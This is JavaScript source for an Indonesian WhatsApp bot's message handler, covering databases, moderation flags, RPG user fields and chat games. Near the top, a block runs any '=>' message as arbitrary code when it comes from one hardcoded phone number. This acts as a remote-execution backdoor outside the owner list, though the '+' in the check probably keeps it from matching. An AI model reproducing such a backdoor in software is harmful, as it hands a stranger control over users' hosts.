require('./settings')
require('./lib/listmenu')
const { default: downloadContentFromMessage } = require("@whiskeysockets/baileys")
const { modul } = require('./module')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const { color, bgcolor } = require('./lib/color')
const { TelegraPh } = require('./lib/uploader')
const { fetchBuffer, buffermagef } = require("./lib/myfunc2")
const { rentfromxeon, conns } = require('./RentBot')
const { uptotelegra } = require('./scrape/upload')
const JavaScriptObfuscator = require('javascript-obfuscator');
const { msgFilter } = require('./lib/antispam')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess') 
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const { XeonInstaMp4 } = require('./scrape/XeonInstaMp4')
const { XeonIgImg } = require('./scrape/XeonIgImg')
const { XeonFb } = require('./scrape/XeonFb')
const { XeonTwitter } = require('./scrape/XeonTwitter')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const textpro2 = require('./scrape/textpro2')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const xeonverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./YaeMedia/database/xeonvn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./YaeMedia/database/xeonsticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./YaeMedia/database/xeonimage.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./YaeMedia/database/xeonvideo.json'))
const BadXeon = JSON.parse(fs.readFileSync('./database/bad.json'))
const pler = JSON.parse(fs.readFileSync('./database/idgrup.json').toString())
const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

// read database
let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.others.vote = []

module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const XeonTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const XeonTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
     const jangan = m.isGroup ? pler.includes(m.chat) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = xeonverifieduser.includes(sender)
    	const banUser = await XeonBotInc.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
      const isAutoAiGc = m.isGroup ? openaigc.includes(m.chat) : true
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const isMute= mute.includes(m.chat) ? true : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : true
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isSimi = siminya.includes(m.chat) ? true : false 
        const Xeonstickwait = () => {
        let XeonStikRep = fs.readFileSync('./YaeMedia/theme/sticker_reply/wait.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickAdmin = () => {
        let XeonStikRep = fs.readFileSync('./YaeMedia/theme/sticker_reply/admin.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickBotAdmin = () => {
        let XeonStikRep = fs.readFileSync('./YaeMedia/theme/sticker_reply/botadmin.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickOwner = () => {
        let XeonStikRep = fs.readFileSync('./YaeMedia/theme/sticker_reply/owner.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickGroup = () => {
        let XeonStikRep = fs.readFileSync('./YaeMedia/theme/sticker_reply/group.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
        const XeonStickPrivate = () => {
        let XeonStikRep = fs.readFileSync('./YaeMedia/theme/sticker_reply/private.webp')
        XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
        }
   
        //TIME
        const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Selamat Malam 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Selamat pagi 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Selamat Pagi 🌄`
 } 

let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)

		if (isEval && senderNumber == "+6285892928715") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					m.reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await XeonBotInc.sendMessage(from, { text: evaled }, { quoted: m })
			} catch (e) {
				XeonBotInc.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {

}
if (user) {
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0

if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 100000,
exp: 0,
limit: 30,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 100,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 0,
armordurability: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0

}



const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
	  } else global.db.settings[botNumber] = {
    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		auto_ai_grup: true,
    		goodbye: true, 
        welcome: true, 
    		autoread: false
	    }

} catch (err) {
console.error(err)
}

if (m.isGroup && isMute) {
if (!isAdmins && !XeonTheCreator) return
}


if (!XeonBotInc.public) {
if (!XeonTheCreator) return
}

// auto message

//=========================================\\
//=========================================\\
//chat counter (console log)
        if (m.message && m.isGroup) {
            XeonBotInc.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            XeonBotInc.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ██▒▒▒▒▒▒▒▒▒▒》20%",
"《 ███▒▒▒▒▒▒▒▒▒》30%",
"《 ████▒▒▒▒▒▒▒▒》40%",
"《 █████▒▒▒▒▒▒▒》50%",
"《 ██████▒▒▒▒▒▒》60%",
"《 ███████▒▒▒▒▒》70%",
"《 ████████▒▒▒▒》80%",
"《 █████████▒▒▒》90%",
"《 ██████████▒▒》95%",
"《 ████████████》100%",
"ʟᴏᴀᴅɪɴɢ ꜱᴇʟᴇꜱᴀɪ..."
]
let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

if (isCmd && !isUser) {
xeonverifieduser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(xeonverifieduser, null, 2))
}

XeonBotInc.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan Tag Dia!
Dia AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

if (m.text.includes('🗿')) {
    XeonBotInc.sendMessage(m.chat, {
          react: {
            text: '😱',
            key: m.key
          }})
        }


//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

await m.reply(`🎮 Kuis Matematika 🎮\tidak ada Jawaban Benar 🎉\dan Mau Main Lagi? Mengirim ${prefix}math mode`)

delete kuismath[m.sender.split('@')[0]]

            } else m.reply('*Wrong Answer!*')

        }


//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Permainan Telah Berakhir',
	    '-2': 'Tidak sah',
	    '-1': 'Posisi Tidak Valid',
	    0: 'Posisi Tidak Valid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Ketik *surrender* untuk menyerah dan mengaku kalah`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await XeonBotInc.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await XeonBotInc.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    XeonBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    XeonBotInc.sendText(m.chat, `Jas telah dikirim ke obrolan

@${roof.p.split`@`[0]} and 
